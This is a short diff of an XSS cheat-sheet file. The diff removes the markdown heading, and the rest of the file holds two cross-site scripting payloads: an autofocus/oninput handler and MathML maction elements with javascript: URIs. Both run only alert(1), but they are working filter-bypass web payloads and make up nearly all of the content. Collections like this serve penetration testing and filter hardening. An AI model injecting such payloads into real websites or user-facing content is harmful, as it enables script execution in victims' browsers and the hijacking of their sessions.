@@ -1,4 +1,4 @@
-# xss-cheat-sheet
+
 xss cheat sheet
 <body oninput=javascript:alert(1)><input autofocus>
 <math href="javascript:javascript:alert(1)">CLICKME</math> <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
